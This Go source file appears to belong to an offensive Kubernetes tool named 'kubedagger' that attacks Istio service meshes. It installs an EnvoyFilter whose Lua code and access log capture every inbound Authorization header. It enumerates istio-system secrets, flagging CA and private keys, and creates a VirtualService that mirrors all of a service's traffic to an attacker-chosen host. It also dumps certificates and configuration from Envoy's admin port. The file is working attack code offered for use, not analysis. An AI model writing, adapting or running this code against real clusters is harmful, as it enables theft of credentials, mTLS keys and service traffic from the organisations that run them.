package servicemesh

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/apimachinery/pkg/apis/meta/v1/unstructured"
	"k8s.io/apimachinery/pkg/runtime/schema"
	"k8s.io/client-go/dynamic"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

var (
	istioVSGVR = schema.GroupVersionResource{
		Group: "networking.istio.io", Version: "v1beta1", Resource: "virtualservices",
	}
	istioEnvoyFilterGVR = schema.GroupVersionResource{
		Group: "networking.istio.io", Version: "v1alpha3", Resource: "envoyfilters",
	}
)

func InjectXDSConfig(ctx context.Context, dynClient dynamic.Interface, ns, targetService string, port int64) (string, error) {
	var sb strings.Builder
	sb.WriteString("Istio xDS Injection:\n")

	envoyFilter := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "networking.istio.io/v1alpha3",
			"kind":       "EnvoyFilter",
			"metadata": map[string]any{
				"name":      "kubedagger-intercept",
				"namespace": ns,
			},
			"spec": map[string]any{
				"workloadSelector": map[string]any{
					"labels": map[string]any{
						"app": targetService,
					},
				},
				"configPatches": []any{
					map[string]any{
						"applyTo": "NETWORK_FILTER",
						"match": map[string]any{
							"context": "SIDECAR_INBOUND",
							"listener": map[string]any{
								"filterChain": map[string]any{
									"filter": map[string]any{
										"name": "envoy.filters.network.http_connection_manager",
									},
								},
							},
						},
						"patch": map[string]any{
							"operation": "MERGE",
							"value": map[string]any{
								"typed_config": map[string]any{
									"@type": "type.googleapis.com/envoy.extensions.filters.network.http_connection_manager.v3.HttpConnectionManager",
									"access_log": []any{
										map[string]any{
											"name": "envoy.access_loggers.file",
											"typed_config": map[string]any{
												"@type":   "type.googleapis.com/envoy.extensions.access_loggers.file.v3.FileAccessLog",
												"path":    "/dev/stdout",
												"log_format": map[string]any{
													"text_format_source": map[string]any{
														"inline_string": "[INTERCEPT] %REQ(:METHOD)% %REQ(:PATH)% %REQ(:AUTHORITY)% %REQ(AUTHORIZATION)%\n",
													},
												},
											},
										},
									},
								},
							},
						},
					},
					map[string]any{
						"applyTo": "HTTP_FILTER",
						"match": map[string]any{
							"context": "SIDECAR_INBOUND",
							"listener": map[string]any{
								"portNumber": port,
								"filterChain": map[string]any{
									"filter": map[string]any{
										"name": "envoy.filters.network.http_connection_manager",
									},
								},
							},
						},
						"patch": map[string]any{
							"operation": "INSERT_BEFORE",
							"value": map[string]any{
								"name": "envoy.filters.http.lua",
								"typed_config": map[string]any{
									"@type": "type.googleapis.com/envoy.extensions.filters.http.lua.v3.Lua",
									"inline_code": `
function envoy_on_request(handle)
  local auth = handle:headers():get("authorization")
  if auth then
    handle:logInfo("[KUBEDAGGER] auth=" .. auth)
  end
end`,
								},
							},
						},
					},
				},
			},
		},
	}

	_, err := dynClient.Resource(istioEnvoyFilterGVR).Namespace(ns).Create(ctx, envoyFilter, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  EnvoyFilter creation failed: %v\n", err)
		return sb.String(), nil
	}

	fmt.Fprintf(&sb, "  Created EnvoyFilter 'kubedagger-intercept' in %s\n", ns)
	fmt.Fprintf(&sb, "  Target: workload with app=%s on port %d\n", targetService, port)
	sb.WriteString("  Effect: intercepts authorization headers via Lua filter\n")
	sb.WriteString("  Access logs capture all request metadata\n")

	return sb.String(), nil
}

func ExtractMTLSCerts(ctx context.Context) (string, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return "", err
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return "", err
	}

	var sb strings.Builder
	sb.WriteString("Istio mTLS Certificate Extraction:\n")

	secrets, err := client.CoreV1().Secrets("istio-system").List(ctx, metav1.ListOptions{})
	if err != nil {
		return "", fmt.Errorf("failed to list istio-system secrets: %w", err)
	}

	for _, s := range secrets.Items {
		if strings.Contains(s.Name, "ca") || strings.Contains(s.Name, "cert") || strings.Contains(s.Name, "istio") {
			fmt.Fprintf(&sb, "  Secret: %s (type=%s)\n", s.Name, s.Type)
			for key, val := range s.Data {
				if strings.HasSuffix(key, ".pem") || strings.HasSuffix(key, ".crt") || strings.HasSuffix(key, ".key") || key == "ca-cert.pem" || key == "ca-key.pem" || key == "root-cert.pem" {
					fmt.Fprintf(&sb, "    %s: %d bytes\n", key, len(val))
					if strings.Contains(key, "key") {
						sb.WriteString("      [PRIVATE KEY PRESENT]\n")
					}
				}
			}
		}
	}

	proxyPaths := []string{
		"/etc/certs/cert-chain.pem",
		"/etc/certs/key.pem",
		"/etc/certs/root-cert.pem",
		"/var/run/secrets/istio/root-cert.pem",
		"/var/run/secrets/istio/key.pem",
		"/var/run/secrets/istio/cert-chain.pem",
	}

	sb.WriteString("\n  Sidecar cert paths (check from agent pod):\n")
	for _, p := range proxyPaths {
		fmt.Fprintf(&sb, "    %s\n", p)
	}

	return sb.String(), nil
}

func HijackTraffic(ctx context.Context, dynClient dynamic.Interface, ns, targetService, redirectHost string, redirectPort int64) (string, error) {
	var sb strings.Builder
	sb.WriteString("Traffic Hijack via VirtualService:\n")

	vs := &unstructured.Unstructured{
		Object: map[string]any{
			"apiVersion": "networking.istio.io/v1beta1",
			"kind":       "VirtualService",
			"metadata": map[string]any{
				"name":      fmt.Sprintf("%s-mirror", targetService),
				"namespace": ns,
			},
			"spec": map[string]any{
				"hosts": []any{targetService},
				"http": []any{
					map[string]any{
						"mirror": map[string]any{
							"host": redirectHost,
							"port": map[string]any{
								"number": redirectPort,
							},
						},
						"mirrorPercentage": map[string]any{
							"value": float64(100),
						},
						"route": []any{
							map[string]any{
								"destination": map[string]any{
									"host": targetService,
								},
							},
						},
					},
				},
			},
		},
	}

	_, err := dynClient.Resource(istioVSGVR).Namespace(ns).Create(ctx, vs, metav1.CreateOptions{})
	if err != nil {
		fmt.Fprintf(&sb, "  VirtualService creation failed: %v\n", err)
		return sb.String(), nil
	}

	fmt.Fprintf(&sb, "  Created VirtualService '%s-mirror' in %s\n", targetService, ns)
	fmt.Fprintf(&sb, "  Mirroring 100%% traffic from %s to %s:%d\n", targetService, redirectHost, redirectPort)

	return sb.String(), nil
}

func DumpEnvoyConfig(ctx context.Context, podIP string) (string, error) {
	var sb strings.Builder
	sb.WriteString("Envoy Admin Dump:\n")

	adminPort := "15000"
	endpoints := []struct {
		name string
		path string
	}{
		{"clusters", "/clusters"},
		{"config_dump", "/config_dump?include_eds"},
		{"listeners", "/listeners"},
		{"certs", "/certs"},
	}

	httpClient := &http.Client{Timeout: 5 * time.Second}
	for _, ep := range endpoints {
		url := fmt.Sprintf("http://%s:%s%s", podIP, adminPort, ep.path)
		resp, err := httpClient.Get(url)
		if err != nil {
			fmt.Fprintf(&sb, "  [%s] error: %v\n", ep.name, err)
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32768))
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			if ep.name == "certs" {
				var certs any
				if json.Unmarshal(body, &certs) == nil {
					formatted, _ := json.MarshalIndent(certs, "  ", "  ")
					fmt.Fprintf(&sb, "  [%s] %s\n", ep.name, string(formatted[:min(2000, len(formatted))]))
				}
			} else {
				fmt.Fprintf(&sb, "  [%s] %d bytes (first 500): %s\n", ep.name, len(body), string(body[:min(500, len(body))]))
			}
		} else {
			fmt.Fprintf(&sb, "  [%s] status=%d\n", ep.name, resp.StatusCode)
		}
	}

	return sb.String(), nil
}
